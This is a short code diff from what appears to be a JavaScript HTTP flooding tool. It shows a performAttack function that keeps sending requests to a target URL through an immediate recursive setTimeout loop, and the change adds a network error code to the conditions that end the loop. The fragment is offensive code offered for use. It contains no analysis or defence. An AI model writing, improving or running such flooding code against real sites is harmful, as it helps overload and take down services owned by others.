@@ -117,7 +117,7 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
         setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
     })
     .catch((err) => {
-        if (err.code === 'ECONNRESET' || err.code === 'ECONNREFUSED') {
+        if (err.code === 'ECONNRESET' || err.code === 'ECONNREFUSED' || err.code === 'EHOSTUNREACH') {
             console.log(rainbow("Connection reset or refused. Stopping further attacks."));
             continueAttack = false;
         } else if (err.response?.status === 404) {
